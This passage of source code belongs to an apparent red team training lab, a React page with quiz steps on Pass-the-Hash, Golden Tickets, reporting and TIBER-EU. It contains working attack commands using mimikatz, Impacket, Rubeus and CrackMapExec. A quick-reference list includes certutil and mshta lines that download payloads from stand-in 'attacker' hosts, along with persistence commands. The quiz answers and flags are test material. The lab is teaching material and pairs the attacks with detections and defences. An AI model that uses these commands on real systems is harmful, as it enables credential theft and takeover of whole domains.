  TA0006  Credential Access       Stealing credentials (LSASS dump, Kerberoasting, keylogging)
  TA0007  Discovery               Learning the environment (AD enum, network scan, file search)
  TA0008  Lateral Movement        Moving to other systems (PtH, PtT, WMI, SMB)
  TA0009  Collection              Gathering data (email, files, screen capture)
  TA0010  Exfiltration            Getting data out (DNS tunnel, cloud upload, C2 channel)
  TA0011  Command and Control     Beacon communication (C2 frameworks, DNS C2)
  TA0040  Impact                  Causing damage (ransomware, data destruction, DoS)

Purple team exercise structure:
  1. Select ATT&CK technique to test (e.g., T1055.001 Dynamic-link Library Injection)
  2. Red team executes the technique in a controlled way
  3. Blue team checks: did we detect it? Which alert fired? Was it the right one?
  4. If not detected: blue team builds detection rule (Sigma rule, SIEM query)
  5. Red team executes again to validate the new detection fires
  6. Iterate across the entire ATT&CK matrix systematically

Tools for purple team exercises:
  Atomic Red Team (Red Canary): scripts for each ATT&CK technique
    Invoke-AtomicTest T1003.001    Execute LSASS credential dumping test
  VECTR: platform for tracking purple team coverage
  Caldera (MITRE): automated adversary emulation
  Sigma: vendor-neutral detection rule format convertible to any SIEM

Detection engineering from purple team output:
  For each technique: what logs does it generate? What fields are anomalous?
  Write Sigma rules → convert to Splunk/Elastic/QRadar/Sentinel queries
  Test rules against historical logs to measure false positive rate
  Deploy to SIEM with appropriate severity and escalation`,
    flag: 'FLAG{purple_team_complete}'
  },
  {
    id: 'redteam-15',
    title: 'Phase 5 — Pass-the-Hash and Overpass-the-Hash',
    objective: `NTLM authentication works by having the client hash the user's password and send it as proof of identity — the server validates the hash against its stored copy. This means the hash IS the credential. You don't need to crack it. Pass-the-Hash directly uses the NT hash to authenticate over SMB, WMI, or any NTLM-based service. From Linux, which Impacket tool performs Pass-the-Hash and drops an interactive shell on the target?`,
    hint: 'impacket-psexec is the classic PtH tool. The -hashes flag accepts :NTLM_HASH format.',
    answers: ['impacket-psexec', 'psexec.py', 'wmiexec.py', 'impacket-wmiexec', 'smbexec.py', 'cme smb'],
    xp: 25,
    explanation: `Pass-the-Hash is one of the most reliable attack techniques in Windows environments — no cracking required, no lockout risk.

Pass-the-Hash with Impacket:
  impacket-psexec CORP/admin@TARGET_IP -hashes :NTLM_HASH
  impacket-wmiexec CORP/admin@TARGET_IP -hashes :NTLM_HASH    (stealthier — no service)
  impacket-smbexec CORP/admin@TARGET_IP -hashes :NTLM_HASH

CrackMapExec bulk Pass-the-Hash:
  cme smb 192.168.1.0/24 -u admin -H NTLM_HASH --local-auth    Check where hash works
  cme smb 192.168.1.0/24 -u admin -H NTLM_HASH -x "whoami"     Execute on all reachable

Pass-the-Hash with mimikatz (from Windows):
  sekurlsa::pth /user:admin /domain:CORP /ntlm:HASH /run:cmd.exe
  Spawns cmd.exe running as admin — can now use net use, wmic, psexec normally

Overpass-the-Hash (NT Hash -> Kerberos TGT):
  mimikatz sekurlsa::pth /user:admin /domain:corp.local /ntlm:HASH /run:cmd.exe
  Then in that shell: klist  → you now have a Kerberos TGT
  Use this TGT for all subsequent auth (Kerberos instead of NTLM)
  Useful when NTLM is blocked but Kerberos is allowed

Pass-the-Ticket (steal and inject Kerberos tickets):
  mimikatz sekurlsa::tickets /export        Export all cached tickets to .kirbi files
  mimikatz kerberos::ptt ticket.kirbi       Inject stolen ticket into current session
  Rubeus.exe dump /nowrap                   Dump all tickets in base64
  Rubeus.exe ptt /ticket:BASE64_TICKET      Inject ticket

Protected Users security group (blocks PtH):
  Members cannot use NTLM authentication (Kerberos only)
  No cached credentials, no delegation
  Best protection against credential theft attacks — use for all privileged accounts

Detection: Event ID 4624 (logon) with unusual workstation name, NTLM logon type 3 from unexpected sources.`
  },
  {
    id: 'redteam-16',
    title: 'Phase 5 — Domain Dominance and Golden Tickets',
    objective: `Achieving Domain Admin is not the endpoint of a red team engagement — demonstrating persistent, undetectable control is. A Golden Ticket is a forged Kerberos TGT signed with the krbtgt account's NT hash. It grants access to any resource in the domain for up to 10 years, works even if the real account is deleted, and bypasses most logging. The krbtgt hash is required. What mimikatz command forges a Golden Ticket and injects it into the current session?`,
    hint: 'mimikatz uses kerberos::golden to create Golden Tickets. It requires domain SID, krbtgt hash, and username.',
    answers: ['kerberos::golden', 'mimikatz kerberos::golden', 'golden ticket', 'rubeus golden'],
    xp: 30,
    flag: 'FLAG{domain_persistence}',
    explanation: `Domain dominance techniques give the red team (and real APTs) persistent, undetectable access that survives password resets, account deletions, and most incident response activities.

Golden Ticket creation:
  mimikatz kerberos::golden /user:Administrator /domain:corp.local /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt
  /ptt = inject into current session immediately

  Properties:
  - Valid for 10 years by default
  - Works even after Administrator account deleted
  - Survives password changes UNTIL krbtgt hash is rotated twice
  - Can specify any username, any group membership (including DA)

Getting the krbtgt hash:
  Via DCSync: mimikatz lsadump::dcsync /user:krbtgt
  Via NTDS.dit: impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
  Via Volume Shadow Copy: extract NTDS.dit from shadow copy

Diamond Ticket (stealthier alternative):
  Modify a legitimate TGT rather than forge one from scratch
  Has a valid PAC signature from the DC — defeats some Golden Ticket detections
  Rubeus.exe diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500

Silver Ticket (per-service, no DC contact):
  Forged TGS signed with service account hash (not krbtgt)
  DC never sees this ticket — completely off-DC-logs
  Target specific services: CIFS (shares), HOST (task scheduler), HTTP (WinRM), LDAP

AdminSDHolder persistence:
  AdminSDHolder is the template for all protected admin groups (DA, EA, Schema Admins)
  Every 60 minutes SDProp synchronises AdminSDHolder ACL to all protected groups
  Modify AdminSDHolder ACL to give your account GenericAll → persists through DACL changes

DSRM (Directory Services Restore Mode) account:
  Every DC has a local admin account for recovery mode
  Enable for network logon: reg add HKLM/System/CurrentControlSet/Control/Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2
  Now DSRM password works as local admin on DC even if all domain accounts rotated

Double krbtgt rotation for Golden Ticket invalidation:
  Rotate krbtgt password TWICE (existing tickets use old hash)
  First rotation: invalidates Golden Tickets made before rotation
  Second rotation (24h later): invalidates tickets cached from first rotation period`
  },
  {
    id: 'redteam-17',
    title: 'Phase 6 — Red Team Reporting: Telling the Story',
    objective: `A red team report is not just a list of vulnerabilities — it is a narrative that helps the organisation understand how an attacker moved from a phishing email to Domain Admin in 48 hours. The most important section for leadership is the executive summary, which must convey business risk without technical jargon. For technical teams, the attack narrative with MITRE ATT&CK TTP mappings and specific log evidence is what enables them to build detections. What document do red teams provide to prove they are authorised to test if stopped by law enforcement?`,
    hint: 'This document, sometimes called a "get out of jail free letter", confirms legal authorisation for the engagement.',
    answers: ['get out of jail free letter', 'authorization letter', 'rules of engagement', 'scope letter', 'engagement letter'],
    xp: 20,
    explanation: `Red team reporting is the output that justifies the cost of the engagement and drives actual security improvement.

Report structure:
  1. Executive Summary (2 pages max)
     Business risk language: "An attacker with a phishing email could access all customer data in 48 hours"
     Key metrics: time to initial access, time to domain admin, dwell time before detection
     Strategic recommendations: prioritised list of highest-impact controls

  2. Engagement Scope
     Authorised IP ranges, systems, attack vectors
     Out-of-scope systems (critical infrastructure, live production DBs)
     Rules of engagement: what was and wasn't allowed
     Timeline: start date, end date, key milestones

  3. Attack Narrative (chronological story)
     Day 1: Sent phishing email to 47 employees. 12 clicked, 3 submitted credentials.
     Day 1 (3h later): Used submitted credentials to access VPN.
     Day 2: Escalated from VPN user to Domain Admin via Kerberoasting + weak service account password.
     Day 3: Achieved all defined objectives: exfiltrated crown jewel file, accessed finance system.

  4. Technical Findings (per-vulnerability)
     Title, CVSS score, affected systems
     Description and business impact
     Steps to reproduce (evidence: screenshots, command output)
     Remediation with specific technical steps

  5. MITRE ATT&CK Heatmap
     Map every technique used to ATT&CK TTP IDs
     Highlight which TTPs were detected vs missed by blue team

Key metrics for the report:
  Time to Initial Access:   How long from engagement start to first shell?
  Time to Domain Admin:     How long from first shell to full domain control?
  Dwell Time:               How long before the blue team noticed anything?
  Detection Rate:           What percentage of techniques generated alerts?
  Objectives Achieved:      Were the defined crown jewels accessed?

Debrief formats:
  Technical debrief: For SOC/blue team — share all TTPs, IOCs, and what was missed
  Executive debrief: For CISO/leadership — business risk, investment recommendations, risk reduction roadmap`
  },
  {
    id: 'redteam-18',
    title: 'Phase 6 — TIBER-EU and Full Operation Lifecycle',
    objective: `TIBER-EU (Threat Intelligence-Based Ethical Red Teaming) is the European framework for red team testing of financial institutions — used by central banks, major financial groups, and payment providers. Unlike standard pentests, TIBER-EU requires the attack scenarios to be based on real threat intelligence about threat actors actually targeting the sector. The framework has four phases. What is the phase between Preparation and the Red Team Test that defines attack scenarios based on real threat actor TTPs?`,
    hint: 'The phase that maps real adversary behaviour to test scenarios is the Threat Intelligence phase.',
    answers: ['threat intelligence', 'ti phase', 'threat intelligence phase', 'targeted threat intelligence'],
    xp: 35,
    flag: 'FLAG{red_team_complete}',
    explanation: `TIBER-EU represents the gold standard for regulated-sector red team testing — the methodology ensures tests are realistic, governed, and actionable.

TIBER-EU phases:
  1. Preparation:          Scope definition, procurement, legal agreements, NDA
  2. Threat Intelligence:  External TI provider profiles real threat actors targeting the sector
                           Creates Targeted Threat Intelligence (TTI) report
                           TTI defines specific attack scenarios based on real adversary TTPs
  3. Red Team Test:        Red team executes ONLY the scenarios defined in the TTI report
                           Tests are based on real adversaries — not generic pentester creativity
  4. Closure:              Joint debrief, remediation tracking, regulatory attestation

Full red team operation lifecycle (any framework):
  PRE-ENGAGEMENT
    Scoping meeting — define crown jewels, out-of-scope systems, success criteria
    Rules of Engagement document — what is and isn't allowed
    Get-out-of-jail letter — signed authorisation if stopped by law enforcement
    Emergency contacts — who to call if something breaks or gets escalated
    Deconfliction process — mechanism to halt attack if real incident occurs

  RECONNAISSANCE
    Passive: Maltego, Shodan, crt.sh, LinkedIn, GitHub, WHOIS, wayback machine
    Active: Port scanning, web crawling, email enumeration (OSINT to pretext)

  WEAPONISATION
    Payload development — custom implant or modified open-source tool
    Infrastructure — C2 servers, redirectors, phishing domains, SMTP relay
    TTI scenario implementation — build the attack chain from the TI report

  DELIVERY
    Spearphishing — targeted email with pretext from TI research
    Watering hole — compromise a site the target frequents
    Physical — USB drop, tailgating, badge cloning

  EXPLOITATION + POST-EXPLOITATION
    Initial foothold, privilege escalation, C2 establishment, persistence

  OBJECTIVE ACHIEVEMENT
    Reach crown jewels, demonstrate realistic business impact

  REPORTING + PURPLE TEAM
    Findings → technical debrief → MITRE ATT&CK mapping → detection building`
  },
]

const xpTotal = steps.reduce((sum, s) => sum + s.xp, 0)

export default function RedTeamLab() {
  const [guidedDone, setGuidedDone] = useState(false)
  const [freeLaunched, setFreeLaunched] = useState(false)
  const [earnedXp, setEarnedXp] = useState(0)
  const [showKeywords, setShowKeywords] = useState(false)

  useEffect(() => {
    const saved = localStorage.getItem('lab_red-team-lab')
    if (saved) {
      const d = JSON.parse(saved)
      if (d.done) { setGuidedDone(true); setEarnedXp(d.xp || 0) }
    }
  }, [])

  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#7a1a1a' }}>
        <Link href="/" style={{ color: '#7a1a1a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>&#8250;</span>
        <Link href="/modules/red-team" style={{ color: '#7a1a1a', textDecoration: 'none' }}>RED TEAM OPS</Link>
        <span>&#8250;</span>
        <span style={{ color: accent }}>LAB</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '6px', alignItems: 'center' }}>
          <Link href="/modules/red-team" style={{ textDecoration: 'none', padding: '3px 10px', border: '1px solid #3a0505', borderRadius: '3px', color: '#7a1a1a', fontSize: '7.5px', letterSpacing: '0.1em' }}>&#8592; CONCEPT</Link>
          <span style={{ padding: '3px 10px', background: 'rgba(255,51,51,0.1)', border: '1px solid rgba(255,51,51,0.4)', borderRadius: '3px', color: accent, fontSize: '7.5px', letterSpacing: '0.1em', fontWeight: 700 }}>LAB ACTIVE</span>
        </div>
      </div>

      {/* Progress banner */}
      <div style={{ background: 'rgba(255,51,51,0.04)', border: '1px solid rgba(255,51,51,0.15)', borderRadius: '6px', padding: '10px 16px', marginBottom: '1.5rem', display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap' }}>
        <div style={{ display: 'flex', gap: '6px' }}>
          {[{ label: 'PHASE 1', done: true, active: !guidedDone }, { label: 'PHASE 2', done: guidedDone, active: guidedDone }].map((p, i) => (
            <div key={i} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
              <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: p.done ? accent : '#3a0505', border: p.active ? '2px solid ' + accent : '1px solid #3a0505', boxShadow: p.active ? '0 0 6px ' + accent : 'none' }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: p.done ? accent : '#5a1515', letterSpacing: '0.1em' }}>{p.label}</span>
              {i === 0 && <span style={{ fontSize: '7px', color: '#3a0505', margin: '0 2px' }}>-</span>}
            </div>
          ))}
        </div>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#8a4a4a' }}>
          MOD-{moduleNum} &nbsp;·&nbsp; {moduleName.toUpperCase()} &nbsp;·&nbsp; {xpTotal} XP AVAILABLE
        </div>
        {guidedDone && (
          <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: accent, fontWeight: 700 }}>
            &#10003; GUIDED PHASE COMPLETE - LAUNCH FREE LAB BELOW
          </div>
        )}
      </div>

      {/* PHASE 1 */}
      <div style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: 'rgba(255,51,51,0.1)', border: '1px solid rgba(255,51,51,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: accent, fontWeight: 700 }}>1</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#5a1515', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 1 - GUIDED LEARNING</div>
            <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.4rem', fontWeight: 700, color: accent, margin: 0 }}>Red Team Operations Lab</h1>
          </div>
        </div>

        <p style={{ color: '#8a6a6a', fontSize: '0.85rem', marginBottom: '1rem', lineHeight: 1.7, fontFamily: 'JetBrains Mono, monospace' }}>
          C2 infrastructure and OPSEC, LOLBins, lateral movement, process injection, token impersonation,
          Kerberoasting, credential dumping, EDR evasion, supply chain attacks, phishing infra, purple teaming,
          domain dominance, and full operation lifecycle. Complete all 18 steps to unlock Phase 2.
        </p>

        <div style={{ background: 'rgba(255,51,51,0.03)', border: '1px solid rgba(255,51,51,0.12)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.25rem', fontFamily: 'JetBrains Mono, monospace' }}>
          <div style={{ fontSize: '7px', color: '#3a0505', letterSpacing: '0.25em', marginBottom: '8px' }}>KEY CONCEPTS COVERED IN THIS LAB</div>
          <div style={{ display: 'flex', flexWrap: 'wrap', gap: '6px' }}>
            {['C2 architecture', 'C2 OPSEC & redirectors', 'LOLBins / LotL', 'WMI lateral movement', 'Persistence mechanisms', 'Process injection', 'Token impersonation', 'Kerberoasting', 'LSASS credential dumping', 'AMSI & ETW bypass', 'EDR unhooking & syscalls', 'Phishing infrastructure', 'Supply chain attacks', 'Purple teaming', 'Pass-the-Hash', 'Golden Tickets', 'Red team reporting', 'TIBER-EU methodology'].map(c => (
              <span key={c} style={{ fontSize: '7.5px', color: '#8a4a4a', background: 'rgba(255,51,51,0.06)', border: '1px solid rgba(255,51,51,0.12)', padding: '2px 8px', borderRadius: '3px' }}>{c}</span>
            ))}
          </div>
        </div>

        <LabTerminal
          labId="red-team-lab"
          moduleId={moduleId}
          title="Red Team Operations Lab"
          accent={accent}
          steps={steps}
          onComplete={(xp) => { setGuidedDone(true); setEarnedXp(xp) }}
        />
      </div>

      {/* PHASE 2 */}
      <div id="free-lab" style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: guidedDone ? 'rgba(255,51,51,0.15)' : 'rgba(0,0,0,0.3)', border: '1px solid ' + (guidedDone ? 'rgba(255,51,51,0.4)' : '#3a0505'), display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: guidedDone ? accent : '#5a1515', fontWeight: 700 }}>2</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: guidedDone ? '#8a4a4a' : '#5a1515', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 2 - FREE LAB ENVIRONMENT</div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 700, color: guidedDone ? accent : '#5a1515' }}>Full Red Team Practice Sandbox</div>
          </div>
          {guidedDone && !freeLaunched && (
            <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#ffb347', background: 'rgba(255,179,71,0.08)', border: '1px solid rgba(255,179,71,0.2)', padding: '3px 10px', borderRadius: '3px' }}>
              GUIDED PHASE COMPLETE
            </div>
          )}
        </div>

        {!freeLaunched ? (
          <div style={{ background: guidedDone ? 'rgba(255,51,51,0.04)' : '#080202', border: '1px solid ' + (guidedDone ? 'rgba(255,51,51,0.25)' : '#1a0505'), borderRadius: '10px', padding: '2.5rem', textAlign: 'center', position: 'relative', overflow: 'hidden' }}>
            {guidedDone && <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '2px', background: 'linear-gradient(90deg, transparent, ' + accent + ', transparent)' }} />}
            <div style={{ fontSize: '7px', color: guidedDone ? '#8a4a4a' : '#3a0505', letterSpacing: '0.3em', marginBottom: '1rem' }}>
              {guidedDone ? 'READY FOR COMPREHENSIVE TESTING' : 'COMPLETE GUIDED PHASE TO UNLOCK'}
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.2rem', color: guidedDone ? accent : '#5a1515', fontWeight: 700, marginBottom: '0.5rem' }}>
              LAUNCH FULL LAB ENVIRONMENT
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: '#8a4a4a', marginBottom: '0.75rem', lineHeight: 1.7 }}>
              Free-form terminal sandbox for Red Team Operations
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#5a1515', marginBottom: '2rem', lineHeight: 1.7 }}>
              Command history &nbsp;·&nbsp; Tab autocomplete &nbsp;·&nbsp; Real command simulation &nbsp;·&nbsp; No restrictions
            </div>
            <div style={{ display: 'flex', gap: '12px', justifyContent: 'center', flexWrap: 'wrap', marginBottom: '2rem' }}>
              {['Sliver C2 framework', 'LOLBin techniques', 'WMI lateral movement', 'Registry persistence', 'EDR evasion', 'AMSI bypass', 'Phishing infrastructure', 'AD persistence'].map(feat => (
                <div key={feat} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
                  <div style={{ width: '4px', height: '4px', borderRadius: '50%', background: guidedDone ? accent : '#3a0505' }} />
                  <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: guidedDone ? '#8a4a4a' : '#3a0505' }}>{feat}</span>
                </div>
              ))}
            </div>
            <button
              onClick={() => guidedDone && setFreeLaunched(true)}
              disabled={!guidedDone}
              style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.9rem', fontWeight: 700, letterSpacing: '0.15em', padding: '14px 40px', border: '1px solid ' + (guidedDone ? 'rgba(255,51,51,0.6)' : '#3a0505'), borderRadius: '6px', background: guidedDone ? 'rgba(255,51,51,0.12)' : 'transparent', color: guidedDone ? accent : '#3a0505', cursor: guidedDone ? 'pointer' : 'not-allowed', boxShadow: guidedDone ? '0 0 24px rgba(255,51,51,0.18)' : 'none', transition: 'all 0.2s' }}
            >
              {guidedDone ? '&#9658; LAUNCH FREE LAB ENVIRONMENT' : '&#128274; COMPLETE GUIDED PHASE FIRST'}
            </button>
            {!guidedDone && <div style={{ marginTop: '1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: '#3a0505' }}>Complete all 18 guided steps above to unlock the free lab environment</div>}
          </div>
        ) : (
          <div style={{ border: '1px solid ' + accent + '30', borderRadius: '10px', overflow: 'hidden', background: '#080202' }}>
            <FreeLabTerminal moduleId={moduleId} moduleName={moduleName} accent={accent} onClose={() => setFreeLaunched(false)} />
            <div style={{ padding: '8px 16px', background: '#0a0303', borderTop: '1px solid ' + accent + '15', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <div style={{ width: '5px', height: '5px', borderRadius: '50%', background: accent, boxShadow: '0 0 5px ' + accent }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#5a1515' }}>
                You are in free practice mode. Ask <span style={{ color: accent }}>GHOST AGENT</span> (bottom-right) for hints on any red team technique.
              </span>
            </div>
          </div>
        )}
      </div>

      {/* Quick reference */}
      <div style={{ marginBottom: '2rem' }}>
        <button onClick={() => setShowKeywords(!showKeywords)} style={{ background: 'transparent', border: '1px solid #3a0505', borderRadius: '5px', padding: '8px 16px', cursor: 'pointer', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#5a1515', letterSpacing: '0.1em', marginBottom: showKeywords ? '12px' : 0 }}>
          {showKeywords ? '▼' : '▶'} QUICK REFERENCE - RED TEAM COMMANDS
        </button>
        {showKeywords && (
          <div style={{ background: '#080202', border: '1px solid #1a0505', borderRadius: '6px', padding: '1.25rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(320px, 1fr))', gap: '8px' }}>
              {[
                ['sliver-server', 'Start Sliver C2 server'],
                ['sliver-client', 'Connect Sliver operator client'],
                ['certutil -urlcache -split -f http://attacker/payload.exe', 'LOLBin file download via certutil'],
                ['wmic /node:target process call create "powershell -enc BASE64"', 'WMI remote code execution'],
                ['reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Update /t REG_SZ /d C:\\payload.exe', 'Registry run key persistence'],
                ['schtasks /create /tn Update /tr C:\\payload.exe /sc onlogon', 'Scheduled task persistence'],
                ['powershell -nop -exec bypass -w hidden -enc BASE64PAYLOAD', 'PowerShell encoded command'],
                ['mshta.exe javascript:a=(GetObject("script:http://attacker/evil.sct")).Exec();close();', 'MSHTA LOLBin execution'],
                ['Invoke-Mimikatz -Command sekurlsa::logonpasswords', 'Dump creds via PowerShell'],
                ['Invoke-BloodHound -CollectionMethod All', 'BloodHound PowerShell collection'],
                ['Rubeus.exe kerberoast /outfile:hashes.txt', '.NET Kerberoasting'],
                ['SharpHound.exe -c All --zipfilename loot.zip', 'SharpHound AD collection'],
                ['impacket-psexec DOMAIN/user@target -hashes :NTLM_HASH', 'Pass-the-Hash via psexec'],
                ['mimikatz kerberos::golden /user:Administrator /domain:DOMAIN /sid:SID /krbtgt:HASH /ptt', 'Forge Golden Ticket'],
                ['Rubeus.exe ptt /ticket:BASE64TICKET', 'Inject Kerberos ticket'],
                ['gophish', 'Start GoPhish phishing framework'],
              ].map(([cmd, desc]) => (
                <div key={cmd} style={{ display: 'flex', gap: '10px', alignItems: 'flex-start', padding: '6px 8px', background: '#060101', borderRadius: '4px' }}>
                  <code style={{ color: accent, fontSize: '0.72rem', flexShrink: 0 }}>{cmd}</code>
                  <span style={{ color: '#8a4a4a', fontSize: '0.7rem' }}>{desc}</span>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* Footer nav */}
      <div style={{ paddingTop: '2rem', borderTop: '1px solid #1a0505', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '10px' }}>
        <Link href="/modules/red-team" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a1515' }}>&#8592; BACK TO CONCEPT</Link>
        <Link href="/modules/wireless-attacks/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a1515' }}>MOD-12 WIRELESS ATTACKS LAB &#8594;</Link>
      </div>
    </div>
  )
}
